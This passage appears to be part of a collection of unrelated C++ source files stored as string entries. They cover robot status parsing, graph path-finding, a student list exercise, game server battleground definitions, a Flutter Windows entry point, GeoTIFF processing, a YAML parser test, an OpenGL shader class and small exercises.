= recv_buf[13*8+i];\n        }\n        memcpy(&intTemp, intByte, sizeof(int));\n        frrobot_status.tool_num = intTemp;\n\n        // cl_dtg_ouput (DO8-DO15)\n        for (int i = 0; i < 8; i++)\n        {\n            frrobot_status.cl_o_h[i] = (recv_buf[578] >> i) & 0x01;\n        }\n\n        // cl_dtg_ouput (DO0-DO7)\n        for (int i = 0; i < 8; i++)\n        {\n            frrobot_status.cl_o_l[i] = (recv_buf[579] >> i) & 0x01;\n        }\n\n        // tl_dtg_ouput (end_DO1-end_DO0)\n        for (int i = 0; i < 2; i++)\n        {\n            frrobot_status.tl_o_l[i] = (recv_buf[580] >> i) & 0x01;\n        }\n\n        // robot_motion_done\n        for (int i = 0; i < 4; i++)\n        {\n            intByte[i] = recv_buf[int(72.625*8)+i];\n        }\n        memcpy(&intTemp, intByte, sizeof(int));\n        frrobot_status.robot_motion_done = intTemp;\n\n        // gripper_motion_done\n        frrobot_status.gripper_motion_done = recv_buf[585];\n    }\n}\n\nvoid FrRobotStatusCtrl::update()\n{\n    // update status tpoic\n    frcobot_hw::status status_msg;\n\n    status_msg.header.stamp = ros::Time::now();\n    status_msg.frame_count = frrobot_status.frame_count;\n    status_msg.program_state = frrobot_status.program_state;\n    status_msg.error_code = frrobot_status.error_code;\n    status_msg.robot_mode = frrobot_status.robot_mode;\n\n    std::vector<double> joints_sta_(frrobot_status.joints_sta, frrobot_status.joints_sta+6);\n    std::vector<double> tcp_sta_(frrobot_status.tcp_sta, frrobot_status.tcp_sta+6);\n    std::vector<double> torque_sta_(frrobot_status.torque_sta, frrobot_status.torque_sta+6);\n    status_msg.cur_joints_pose = joints_sta_;\n    status_msg.cur_tcp_pose = tcp_sta_;\n    status_msg.cur_joints_torque = torque_sta_;\n\n    status_msg.tool_num = frrobot_status.tool_num;\n\n    std::vector<uint8_t> cl_dgt_output_h_(frrobot_status.cl_o_h, frrobot_status.cl_o_h+8);\n    std::vector<uint8_t> cl_dgt_output_l_(frrobot_status.cl_o_l, frrobot_status.cl_o_l+8);\n    std::vector<uint8_t> tl_dgt_output_l_(frrobot_status.tl_o_l, frrobot_status.tl_o_l+2);\n    status_msg.cl_dgt_output_h = cl_dgt_output_h_;\n    status_msg.cl_dgt_output_l = cl_dgt_output_l_;\n    status_msg.tl_dgt_output_l = tl_dgt_output_l_;\n\n    status_ms",
    "#include \"DataSetUp.h\"\r\n#include <iostream>\r\n#include <queue>\r\n#include <unordered_map>\r\n#include <vector>\r\n#include <climits>\r\n\r\nusing namespace std;\r\n\r\n// Function to find the nearest place of a given type from the start location using the specified mode of transportation\r\nvoid pathFromA_ByMode(int start, const string &end, const string &mode) {\r\n    // Determine the mode of transportation\r\n    bool bikeMode = (mode == \"bike\");\r\n    bool carMode = (mode == \"car\");\r\n    bool walkMode = (mode == \"walk\");\r\n\r\n    // Initialize visited vector and priority queue for Dijkstra's algorithm\r\n    vector<bool> visited(edges.size(), false);\r\n    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> pq;\r\n    pq.push({0, start});\r\n\r\n    // Initialize parent map and distance vector\r\n    unordered_map<int, int> parent;\r\n    vector<int> dis(edges.size(), INT_MAX);\r\n    dis[start] = 0;\r\n\r\n    int result = -1;\r\n\r\n    while (!pq.empty()) {\r\n        auto p = pq.top();\r\n        int place = p.second;\r\n        int l = p.first;\r\n        pq.pop();\r\n\r\n        if (visited[place])\r\n            continue;\r\n\r\n        visited[place] = true;\r\n\r\n        // Check if the current place is the destination type\r\n        if (records[place].type == end) {\r\n            result = place;\r\n            break;\r\n        }\r\n\r\n        // Explore neighboring nodes\r\n        for (const auto &in : edges[place]) {\r\n            int placeN = in.end.id;\r\n            int dist = in.distance;\r\n            bool B = in.bike, C = in.car, W = in.walk;\r\n\r\n            // Update distance for bike mode\r\n            if (bikeMode && B && dis[placeN] > dis[place] + dist) {\r\n                dis[placeN] = dis[place] + dist;\r\n                parent[placeN] = place;\r\n                pq.push({dis[placeN], placeN});\r\n            }\r\n\r\n            // Update distance for car mode\r\n            if (carMode && C && dis[placeN] > dis[place] + dist) {\r\n                dis[placeN] = dis[place] + dist;\r\n                parent[placeN] = place;\r\n                pq.push({dis[placeN], placeN});\r\n            }\r\n\r\n            // Update distance for walk mode\r\n            if (walkMode && W && dis[placeN] > dis[place] + dist) {\r\n                dis[placeN] = dis[place] + dist;\r\n                parent[placeN] = place;\r\n                pq.push({dis[placeN], placeN});\r\n            }\r\n        }\r\n    }\r\n\r\n    // Output results\r\n    if (result == -1) {\r\n        cout << \"NO PATH FOUND FROM \" << records[start].name << \" TO \" << end << \" BY THE MODE OF \" << mode << endl;\r\n    } else {\r\n        vector<string> path;\r\n        int current = result;\r\n        while (current != start) {\r\n            path.push_back(records[current].name);\r\n            current = parent[current];\r\n        }\r\n        path.push_back(records[start].name);\r\n\r\n        cout << \"Nearest \" << end << \" from your location by the mode of \" << mode << \" is \" << records[result].name \r\n             << \" at a distance of \" << dis[result] << \"m. The path is:\" << endl;\r\n\r\n        for (int i = path.size() - 1; i >= 0; i--) {\r\n            cout << path[i];\r\n            if (i > 0) cout << \" -> \";\r\n        }\r\n        cout << endl;\r\n    }\r\n}\r\n\r\n// Function to find the nearest service from home based on user input\r\nvoid NearServiceFromHomeBYmode() {\r\n    int HomeId;\r\n    cout << \"Enter the valid ID of your place: \";\r\n    cin >> HomeId;\r\n\r\n    // Validate home ID\r\n    while (HomeId < 0 || HomeId >= 363) {\r\n        cout << \"The place you entered is not recognized. Please try again.\" << endl;\r\n        cout << \"Enter the valid ID of your place: \";\r\n        cin >> HomeId;\r\n    }\r\n\r\n    string place;\r\n\r\n    cout << \"Enter the Type of  place you want to visit   \";\r\n    \r\n    cout<<endl;\r\n    cin >> place;\r\n\r\n    // Validate place\r\n\r\n    while (!UniqueType.count(place)) {\r\n        cout << \"The place you entered is not recognized. Please try again.\" << endl;\r\n        cout << \"Enter the place you want to visit: \";\r\n        cin >> place;\r\n    }\r\n\r\n    string mode;\r\n    cout << \"Tell me the mode you want to travel (bike, car, walk): \";\r\n    cin >> mode;\r\n\r\n    // Validate mode\r\n    while (mode != \"bike\" && mode != \"car\" && mode != \"walk\") {\r\n        cout << \"The mode you entered is not recognized. Please try again.\" << endl;\r\n        cout << \"Tell me the mode you want to travel (bike, car, walk): \";\r\n        cin >> mode;\r\n    }\r\n\r\n    pathFromA_ByMode(HomeId, place, mode);\r\n}\r\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\nconst int MAX_CELDAS = 100;\nint encontrarComunes(string clase1[],int tam1,string clase2[],int tam2,string comunes[]) {\n    int k = 0;\n    for(int i=0;i<tam1;++i){\n        for(int j=0; j<tam2;++j){\n            if(clase1[i]==clase2[j]){\n                comunes[k]=clase1[i];k++;\n                break;\n            }\n        }\n    }\n    return k;\n}\nint main() {\n    int tam1,tam2;\n    do{\n        cout<<\"Ingrese la cantidad de estudiantes en Fundamentos de Programacion (max \"<<MAX_CELDAS<<\"): \";cin>>tam1;\n    }while (tam1<1||tam1>MAX_CELDAS);\n    string fundamentos[MAX_CELDAS];\n    cout<<\"Ingrese los nombres de los estudiantes en Fundamentos de Programacion:\\n\";\n    for(int i=0;i<tam1;++i) {\n        cout<<\"Estudiante \" << i + 1 << \": \";\n        cin>>fundamentos[i];\n    }\n    do{\n        cout<<\"Ingrese la cantidad de estudiantes en Programacion Grafica (max \"<<MAX_CELDAS<<\"): \";cin>>tam2;\n    } while(tam2<1||tam2>MAX_CELDAS);\n     string grafica[MAX_CELDAS];\n    cout<<\"Ingrese los nombres de los estudiantes en Programaci\u00f3n Grafica:\\n\";\n    for(inti=0;i<tam2;++i) {\n        cout<<\"Estudiante \"<<i+1<< \": \";cin>>grafica[i];\n    }\n    string comunes[MAX_CELDAS];\n    int numComunes=encontrarComunes(fundamentos,tam1,grafica,tam2,comunes);\n    if(numComunes>0) {\n        cout<<\"\\nEstudiantes comunes en ambas asignaturas:\\n\";\n        for(int i=0;i<numComunes;++i) {\n            cout<<comunes[i]<<endl;\n        }\n        cout<<\"Numero de estudiantes comunes: \"<<numComunes<<endl;\n    }else{\n        cout<<\"\\nNo hay estudiantes comunes en ambas asignaturas.\"<<endl;\n    }\n    return 0;\n}\n",
    "/*\n * This file is part of the TrinityCore Project. See AUTHORS file for Copyright information\n *\n * This program is free software; you can redistribute it and/or modify it\n * under the terms of the GNU General Public License as published by the\n * Free Software Foundation; either version 2 of the License, or (at your\n * option) any later version.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT\n * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or\n * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for\n * more details.\n *\n * You should have received a copy of the GNU General Public License along\n * with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"BattlegroundScript.h\"\n#include \"alterac_valley.h\"\n#include \"Battleground.h\"\n#include \"BattlegroundMgr.h\"\n#include \"BattlegroundPackets.h\"\n#include \"Creature.h\"\n#include \"CreatureAI.h\"\n#include \"GameObject.h\"\n#include \"GameTime.h\"\n#include \"Log.h\"\n#include \"Map.h\"\n#include \"Player.h\"\n#include \"ScriptMgr.h\"\n\nconstexpr uint32 BG_AV_SCORE_INITIAL_POINTS = 700;\nconstexpr uint32 BG_AV_EVENT_START_BATTLE = 9166; // Achievement: The Alterac Blitz\n\nenum BG_AV_BroadcastTexts\n{\n    BG_AV_TEXT_START_ONE_MINUTE     = 10638,\n    BG_AV_TEXT_START_HALF_MINUTE    = 10639,\n    BG_AV_TEXT_BATTLE_HAS_BEGUN     = 10640,\n\n    BG_AV_TEXT_ALLIANCE_NEAR_LOSE   = 23210,\n    BG_AV_TEXT_HORDE_NEAR_LOSE      = 23211\n};\n\nenum BG_AV_Sounds\n{\n    AV_SOUND_NEAR_VICTORY                   = 8456, /// @todo: Not confirmed yet\n\n    AV_SOUND_ALLIANCE_ASSAULTS              = 8212, //tower, grave + enemy boss if someone tries to attack him\n    AV_SOUND_HORDE_ASSAULTS                 = 8174,\n    AV_SOUND_ALLIANCE_GOOD                  = 8173, //if something good happens for the team:  wins(maybe only through killing the boss), captures mine or grave, destroys tower and defends grave\n    AV_SOUND_HORDE_GOOD                     = 8213,\n    AV_SOUND_BOTH_TOWER_DEFEND              = 8192,\n\n    AV_SOUND_ALLIANCE_CAPTAIN               = 8232, //gets called when someone attacks them and at the beginning after 5min+rand(x)*10sec (maybe buff)\n    AV_SOUND_HORDE_CAPTAIN                  = 8333\n};\n\nconstexpr Seconds BG_AV_MINE_RESOURCE_TIMER = 45s;\n\nenum class AlteracValleyMine : uint8\n{\n    North = 0,\n    South\n};\n\nenum BG_AV_CreatureIds\n{\n    BG_AV_CREATURE_VANNDAR              = 11948,\n    BG_AV_CREATURE_DREKTHAR             = 11946,\n    BG_AV_CREATURE_BALINDA              = 11949,\n    BG_AV_CREATURE_GALVANGAR            = 11947,\n    BG_AV_CREATURE_MORLOCH              = 11657,\n    BG_AV_CREATURE_UMI_THORSON          = 13078,\n    BG_AV_CREATURE_KEETAR               = 13079,\n    BG_AV_CREATURE_TASKMASTER_SNIVVLE   = 11677,\n    BG_AV_CREATURE_AGI_RUMBLESTOMP      = 13086,\n    BG_AV_CREATURE_MASHA_SWIFTCUT       = 13088,\n    BG_AV_CREATURE_HERALD               = 14848,\n\n    BG_AV_CREATURE_STORMPIKE_DEFENDER   = 12050,\n    BG_AV_CREATURE_FROSTWOLF_GUARDIAN   = 12053,\n    BG_AV_CREATURE_SEASONED_DEFENDER    = 13326,\n    BG_AV_CREATURE_SEASONED_GUARDIAN    = 13328,\n    BG_AV_CREATURE_VETERAN_DEFENDER     = 13331,\n    BG_AV_CREATURE_VETERAN_GUARDIAN     = 13332,\n    BG_AV_CREATURE_CHAMPION_DEFENDER    = 13422,\n    BG_AV_CREATURE_CHAMPION_GUARDIAN    = 13421\n};\n\nenum BG_AV_ObjectIds\n{\n    //cause the mangos-system is a bit different, we don't use the right go-ids for every node.. if we want to be 100% like another big server, we must take one object for every node\n    //snowfall 4flags as eyecandy 179424 (alliance neutral)\n    //Banners - stolen from battleground_AB.h ;-)\n    BG_AV_OBJECTID_BANNER_A             = 178925, // can only be used by horde\n    BG_AV_OBJECTID_BANNER_H             = 178943, // can only be used by alliance\n    BG_AV_OBJECTID_BANNER_CONT_A        = 178940, // can only be used by horde\n    BG_AV_OBJECTID_BANNER_CONT_H        = 179435, // can only be used by alliance\n\n    BG_AV_OBJECTID_BANNER_A_B           = 178365,\n    BG_AV_OBJECTID_BANNER_H_B           = 178364,\n    BG_AV_OBJECTID_BANNER_CONT_A_B      = 179286,\n    BG_AV_OBJECTID_BANNER_CONT_H_B      = 179287,\n    BG_AV_OBJECTID_BANNER_SNOWFALL_N    = 180418,\n\n    //snowfall eyecandy banner:\n    BG_AV_OBJECTID_SNOWFALL_CANDY_A     = 179044,\n    BG_AV_OBJECTID_SNOWFALL_CANDY_PA    = 179424,\n    BG_AV_OBJECTID_SNOWFALL_CANDY_H     = 179064,\n    BG_AV_OBJECTID_SNOWFALL_CANDY_PH    = 179425,\n\n    //banners on top of towers:\n    BG_AV_OBJECTID_TOWER_BANNER_A       = 178927, //[PH] Alliance A1 Tower Banner BIG\n    BG_AV_OBJECTID_TOWER_BANNER_H       = 178955, //[PH] Horde H1 Tower Banner BIG\n    BG_AV_OBJECTID_TOWER_BANNER_PA      = 179446, //[PH] Alliance H1 Tower Pre-Banner BIG\n    BG_AV_OBJECTID_TOWER_BANNER_PH      = 179436, //[PH] Horde A1 Tower Pre-Banner BIG\n\n    //Auras\n    BG_AV_OBJECTID_AURA_A               = 180421,\n    BG_AV_OBJECTID_AURA_H               = 180422,\n    BG_AV_OBJECTID_AURA_N               = 180423,\n    BG_AV_OBJECTID_AURA_A_S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"rick_and_morty\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Geotiff.hpp\"\n#include <algorithm>\n#include \"papi.h\"\n#include <numeric>\n#include <experimental/filesystem>\n#include <regex>\n#include <fstream>\n#include <eigen3/Eigen/Dense>\n#include <eigen3/Eigen/SVD>\n\n//Just a wrapper to index 2D image stored as flat array\nclass Image\n{\n    private:\n        int Nrow;\n        int Ncol;\n       \n    public:\n        vector<float> vec;\n        float *data;\n        \n        Image(vector<float> &_data, int _dims[2])\n        {\n            //get image dimensions\n            Nrow = _dims[0];\n            Ncol = _dims[1];\n            data = _data.data();    \n            vec = _data;\n        }\n\n        float &operator()(int row, int col)\n        {\n            return data[row+col*Nrow]; //col major order (to match eigen)\n        }\n};\n\nvoid write_to_file(map<int, map<int,float>> maxes, string filename)\n{\n    ofstream ofile(filename.c_str()); \n    vector<string> months= {\"Jan\",\"Feb\",\"Mar\",\"Apr\",\"May\",\"Jun\",\"Jul\",\"Aug\",\"Sep\",\"Oct\",\"Nov\",\"Dec\"};\n    size_t ncols;\n    for(auto y : maxes){\n        ncols = y.second.size();   \n        break;\n    }\n    ofile << \"year\" << \" \";\n    for(size_t i=0;i<ncols;i++)\n        ofile << months[i] << \" \";\n    ofile<<endl; \n    for( auto y : maxes){\n        ofile << y.first << \" \";\n        for(auto m : y.second)\n            ofile << m.second <<\" \";\n        ofile<<endl;\n    }\n    ofile.close();\n}\n\nvoid write_binary(float* data, int N, int Npc, string fname)\n{\n    ofstream file(fname.c_str(), ios::out|ios::binary);\n    file.write((char*)&N, sizeof(int));\n    file.write((char*)&Npc, sizeof(int));\n    file.write((char*)data, N*Npc*sizeof(float));\n    file.close();\n}\n\n\n//just organizes images by date\nstruct  DateContainer\n{\n   map<int, map<int, map<int, vector<float>>>> images;\n   size_t size = 0;\n\n   //accesses image(s) for particular year/month/day\n   vector<float> &operator()(int year, int month, int day){\n        return images[year][month][day];\n   }\n\n   //accesses image(s) for particular year/month/day\n   vector<float> &operator()(string year, string month, string day){\n        return images[atoi(year.c_str())][atoi(month.c_str())-1][atoi(day.c_str())];\n   }\n\n   //add image while keeping count of how many you've added\n   void add(string year, string month, string day, vector<float> & addv)\n   {\n        images[atoi(year.c_str())][atoi(month.c_str())-1][atoi(day.c_str())] = addv;\n        size++;\n        return;    \n   }   \n};\n\nvoid output_profile( long long int counters[4], long long int dt)\n{\n    long long sflops = counters[0];      \n    long long dflops = counters[1]; \n    long long traffic = counters[2]*sizeof(float); \n    long long total_l1d_cache_misses = counters[3];  // number of such instructions\n    \n    double twall = static_cast<double>(dt) * 1.0e-9; // seconds\n    cout << \"Wall time(s):                 \" << twall << '\\n';\n    cout << \"Flops (Single prec):          \" << sflops << '\\n';\n    cout << \"Flops (Double prec):          \" << dflops << '\\n';\n    cout << \"Traffic (bytes):              \" << traffic << '\\n';\n    cout << \"Operational Intensity:        \" << static_cast<double>(sflops)/traffic << '\\n';\n    cout << \"L1d Cache Misses:             \" << total_l1d_cache_misses << '\\n'; \n    return;\n}\n\n\nint main(int argc, char **argv)\n{   \n    //Get the filename \"either a default or specified from command line\"\n    const char* pszFilename;\n    const char* pszDir;\n\n    if(argc==2)\n        pszDir = argv[1];\n    else if (argc==3){\n\t    std::cout<<\"We can run!\"<<std::endl;\n\t    return 0;\n    }\n    else\n        return EINVAL;\n\n    //profiling stuff\n    int event_set[2] = {PAPI_NULL, PAPI_NULL};\n    int events[4]    = {PAPI_SP_OPS, PAPI_DP_OPS, PAPI_LST_INS, PAPI_L1_DCM};\n    //int memevents[1] = {PAPI_LST_INS};\n    long long int file_read_counters[4]  = {0,0,0,0};\n    long long int processing_counters[4] = {0,0,0,0};\n    long long int ssa_counters[4] = {0,0,0,0};\n    long long int output_counters[4] = {0,0,0,0};\n    //long long int total_lst_ins=0;\n \n    PAPI_library_init(PAPI_VER_CURRENT);\n    PAPI_create_eventset(&event_set[0]);\n    //PAPI_create_eventset(&event_set[1]);\n    PAPI_add_events(event_set[0], events, 4);\n    //PAPI_add_events(event_set[1], memevents, 4); \n    long long int t0;\n    long long int times[4] = {0,0,0,0};\n\n    //profile reading the files\n    map<int, map<int,float>> maxes;\n    map<int, map<int,float>> mins;\n    map<int, map<int,float>> means;\n\n    /********************************read the files*************************/\n    DateContainer data;\n    size_t tot_nel_read=0;\n    t0 = PAPI_get_real_nsec();\n    PAPI_start(event_set[0]);\n    for(const auto& pszFname : experimental::filesystem::recursive_directory_iterator(pszDir))\n    {\n        //get the file name\n        string tmp = pszFname.path().string();\n        pszFilename = tmp.c_str();\n    \n        //get a sense of what date this is from the file name\n        regex pattern(\"20\\\\d{6}_\");\n        auto wbegin = sregex_iterator(tmp.begin(), tmp.end(), pattern);           \n        ",
    "#include <fstream>\n#include <iostream>\n#include <vector>\n\n#include \"yaml-cpp/eventhandler.h\"\n#include \"yaml-cpp/yaml.h\"  // IWYU pragma: keep\n\nclass NullEventHandler : public YAML::EventHandler {\n public:\n  void OnDocumentStart(const YAML::Mark&) override {}\n  void OnDocumentEnd() override {}\n\n  void OnNull(const YAML::Mark&, YAML::anchor_t) override {}\n  void OnAlias(const YAML::Mark&, YAML::anchor_t) override {}\n  void OnScalar(const YAML::Mark&, const std::string&, YAML::anchor_t,\n                const std::string&) override {}\n\n  void OnSequenceStart(const YAML::Mark&, const std::string&, YAML::anchor_t,\n                       YAML::EmitterStyle::value) override {}\n  void OnSequenceEnd() override {}\n\n  void OnMapStart(const YAML::Mark&, const std::string&, YAML::anchor_t,\n                  YAML::EmitterStyle::value) override {}\n  void OnMapEnd() override {}\n};\n\nvoid parse(std::istream& input) {\n  try {\n    YAML::Node doc = YAML::Load(input);\n    std::cout << doc << \"\\n\";\n  } catch (const YAML::Exception& e) {\n    std::cerr << e.what() << \"\\n\";\n  }\n}\n\nint main(int argc, char** argv) {\n  if (argc > 1) {\n    std::ifstream fin;\n    fin.open(argv[1]);\n    parse(fin);\n  } else {\n    parse(std::cin);\n  }\n\n  return 0;\n}\n",
    "#include \"Shader.h\"\r\n\r\nShader::Shader()\r\n{\r\n    shader = 0;\r\n    uniformModel = 0;\r\n    uniformProjection = 0;\r\n}\r\n\r\nShader::~Shader()\r\n{\r\n    ClearShader();\r\n}\r\n\r\n\r\nvoid Shader::CreateFromFiles (const char* vertexLocation, const char* fragmentLocation)\r\n{\r\n    std::string vertexString = ReadFile(vertexLocation);\r\n    std::string fragmentString = ReadFile(fragmentLocation);\r\n\r\n    const char* vertexCode = vertexString.c_str();\r\n    const char* fragmentCode = fragmentString.c_str();\r\n\r\n    CompileShaders(vertexCode, fragmentCode);\r\n}\r\n\r\nstd::string Shader::ReadFile(const char* fileLocation)\r\n{\r\n    std::string content;\r\n    std::ifstream fileStream(fileLocation, std::ios::in);\r\n\r\n    if (!fileStream.is_open())\r\n    {\r\n        printf(\"Failed to read %s!, File doesn't exist.\\n\", fileLocation);\r\n        return \"\";\r\n    }\r\n\r\n    std::string line = \"\";\r\n\r\n    while (!fileStream.eof())\r\n    {\r\n        std::getline(fileStream, line);\r\n        content.append(line + \"\\n\");\r\n    }\r\n\r\n    fileStream.close();\r\n    return content;\r\n}\r\n\r\n\r\nvoid Shader::UseShader()\r\n{\r\n    glUseProgram(shader);\r\n}\r\n\r\nvoid Shader::ClearShader()\r\n{\r\n    if (shader != 0)\r\n    {\r\n        glDeleteProgram(shader);\r\n        shader = 0;\r\n    }\r\n}\r\n\r\nvoid Shader::CreateFromString (const char* vertexCode, const char* fragmentCode)\r\n{\r\n    CompileShaders(vertexCode, fragmentCode);\r\n}\r\n\r\n\r\nvoid Shader::CompileShaders(const char* vertexCode, const char* fragmentCode)\r\n{\r\n    shader = glCreateProgram();\r\n\r\n    if (!shader)\r\n    {\r\n        printf(\"Error creating shader program!\\n\");\r\n        return;\r\n    }\r\n\r\n    AddShader(shader, vertexCode, GL_VERTEX_SHADER);\r\n    AddShader(shader, fragmentCode, GL_FRAGMENT_SHADER);\r\n\r\n    GLint result = 0;\r\n    GLchar elog[1024] = { 0 };\r\n\r\n    glLinkProgram(shader);\r\n    glGetProgramiv(shader, GL_LINK_STATUS, &result);\r\n\r\n    if (!result)\r\n    {\r\n        glGetProgramInfoLog(shader, sizeof(elog), NULL, elog);\r\n        printf(\"Error linking program: '%s'\\n\", elog);\r\n        return;\r\n    }\r\n\r\n    glValidateProgram(shader);\r\n    glGetProgramiv(shader, GL_VALIDATE_STATUS, &result);\r\n\r\n    if (!result)\r\n    {\r\n        glGetProgramInfoLog(shader, sizeof(elog), NULL, elog);\r\n        printf(\"Error validating program: '%s'\\n\", elog);\r\n        return;\r\n    }\r\n\r\n    uniformModel = glGetUniformLocation(shader, \"model\");\r\n    uniformProjection = glGetUniformLocation(shader, \"projection\");\r\n}\r\n\r\nvoid Shader::AddShader(GLuint theProgram, const char* shaderCode, GLenum shaderType)\r\n{\r\n    GLuint theShader = glCreateShader(shaderType);\r\n\r\n    const GLchar* theCode[1];\r\n    theCode[0] = shaderCode;\r\n\r\n    GLint codeLength[1];\r\n    codeLength[0] = strlen(shaderCode);\r\n\r\n    glShaderSource(theShader, 1, theCode, codeLength);\r\n    glCompileShader(theShader);\r\n\r\n    GLint result = 0;\r\n    GLchar elog[1024] = { 0 };\r\n\r\n    glGetShaderiv(theShader, GL_COMPILE_STATUS, &result);\r\n\r\n    if (!result)\r\n    {\r\n        glGetShaderInfoLog(theShader, sizeof(elog), NULL, elog);\r\n        printf(\"Error compiling the %d shader: '%s'\\n\", shaderType, elog);\r\n        return;\r\n    }\r\n\r\n    glAttachShader(theProgram, theShader);\r\n}",
    "#include<iostream>\r\n#include<vector>\r\n#include<algorithm>\r\n\r\nusing namespace std;\r\n\r\nint findMax(vector<int> nums,int begin,int end){\r\n    int maxI=end;\r\n    for(int i=begin;i<end;i++){\r\n        if(i+nums[i]>end+nums[end]){\r\n            maxI=i;\r\n            // break;\r\n        }\r\n    }\r\n    return maxI;\r\n}\r\n\r\nint jump(vector<int>& nums) {\r\n    if(nums.size()==1)return 0;\r\n    int left = 0;\r\n    int right = 0;\r\n    int step=0;\r\n    while(right<=nums.size()-1){\r\n        int i=findMax(nums, left,right);\r\n        cout<<i<<\",\";\r\n        step++;\r\n        if(i!=right){\r\n            left=i;\r\n            right=i+nums[i];\r\n        }\r\n        else{\r\n            left=right;\r\n            right+=nums[right];\r\n        }\r\n    }\r\n    return step;\r\n}\r\n\r\nint jumpRight(vector<int>& nums) {\r\n    if (nums.size() == 1) return 0;\r\n    int curDistance = 0;    // \u5f53\u524d\u8986\u76d6\u6700\u8fdc\u8ddd\u79bb\u4e0b\u6807\r\n    int ans = 0;            // \u8bb0\u5f55\u8d70\u7684\u6700\u5927\u6b65\u6570\r\n    int nextDistance = 0;   // \u4e0b\u4e00\u6b65\u8986\u76d6\u6700\u8fdc\u8ddd\u79bb\u4e0b\u6807\r\n    for (int i = 0; i < nums.size(); i++) {\r\n        nextDistance = max(nums[i] + i, nextDistance);  // \u66f4\u65b0\u4e0b\u4e00\u6b65\u8986\u76d6\u6700\u8fdc\u8ddd\u79bb\u4e0b\u6807\r\n        if (i == curDistance) {    \r\n            cout<<i<<\",\";                     // \u9047\u5230\u5f53\u524d\u8986\u76d6\u6700\u8fdc\u8ddd\u79bb\u4e0b\u6807\r\n            ans++;                                  // \u9700\u8981\u8d70\u4e0b\u4e00\u6b65\r\n            curDistance = nextDistance;             // \u66f4\u65b0\u5f53\u524d\u8986\u76d6\u6700\u8fdc\u8ddd\u79bb\u4e0b\u6807\uff08\u76f8\u5f53\u4e8e\u52a0\u6cb9\u4e86\uff09\r\n            if (nextDistance >= nums.size() - 1) break;  // \u5f53\u524d\u8986\u76d6\u6700\u8fdc\u8ddd\u5230\u8fbe\u96c6\u5408\u7ec8\u70b9\uff0c\u4e0d\u7528\u505aans++\u64cd\u4f5c\u4e86\uff0c\u76f4\u63a5\u7ed3\u675f\r\n        }\r\n    }\r\n    return ans;\r\n}\r\n\r\nint main(){\r\n    vector<int> vec3={1,2,3};\r\n    vector<int> vec1={5,4,0,1,3,6,8,0,9,4,9,1,8,7,4,8};\r\n    vector<int> vec2={7,8,4,2,0,6,4,1,8,7,1,7,4,1,4,1,2,8,2,7,3,7,8,2,4,4,5,3,5,6,8,5,4,4,7,4,3,4,8,1,1,9,0,8,2};\r\n    cout<<jumpRight(vec2);\r\n    return 0;\r\n}\r\n",
    "#define _CRT_SECURE_NO_WARNINGS\n\n#include \"includes.h\"\n#include \"defs.h\"\n\n\nclass ioClass { // special class to manipulate with input-output proccedures\npublic:\n\t\n\tconst char arrSymbols[5] = { '#', '@', '&', '-', '>' };\n\n\tstring text = \"\";\n\t\n\tstring Command = \"\";\n\tstring input = \"\";\n\t\n\n\n\tvoid ChSlash() { //check '/' symbol in command\n\t\t\n\t\tif (Command[0] != '/') {\n\t\t\tcout << endl << endl << \"commands must begin from '/' symbol\";\n\t\t}\n\n\t}\n\n};\n\nclass TextWork {\npublic:\n\n\tstring Text; //class to work with text in \"find\" function\n\t\n\t\n};\n\n\n\n\nint main() {\n\n\n\twhile (true) {\n\t\t//\t\n\t\tlong name = GetName(); // giving a name to txt file\n\t\tstring nameEx = to_string(name);\n\t\tstring FileName = (nameEx +\".txt\");\n\t\tstring ArrMan[] = { \"/wrt\", \"/brk\", \"/clo\", \"/help\", \"/read\", \"/cls\" }; // initialization for actions with program\n\n\n\t\tioClass FirstL;\n\n\t\tcout << \"path: -> main\" << endl << endl;\n\t\tcout << \"'/help' to get commands\" << endl << endl;\n\n\t\tcin >> FirstL.Command;\n\t\tFirstL.ChSlash();\n\n\n\t\tif (FirstL.Command == ArrMan[0]) {\n\t\t\tGet_CLS();\n\n\t\t\twhile (true) {\n\n\t\t\t\tioClass SecondL;\n\n\t\t\t\tofstream FileWrite;\n\n\t\t\t\tFileName = (\"Page/\" + FileName); // filename for unpath fuction\n\n\t\t\t\tstring arrWrtCom[] = { \"/path\", \"/unpath\", \"/brk\" };\n\n\t\t\t\tcout << \"path: -> main -> write in file\" << endl << endl;\n\t\t\t\tcout << \"what next? '/path' - to write in file with path, '/unpath' - to write in file wthout path, '/brk' to close this line\" << endl;\n\t\t\t\tcin >> SecondL.Command;\n\t\t\t\tSecondL.ChSlash(); // check correct of 'command'\n\n\t\t\t\tif (SecondL.Command == arrWrtCom[0]) { // write inside file with path\n\n\t\t\t\t\tioClass insidePathWrt_;\n\t\t\t\t\tTextWork TextPath;\n\n\t\t\t\t\tstring pathP = \"Page/\"; // first part of path to file\n\t\t\t\t\tstring pathS;\t\t\t// second part of path to file\n\t\t\t\t\tstring pathF = \".txt\";  // third part of path to file\n\n\t\t\t\t\tcout << endl << \"please write name of your file\" << 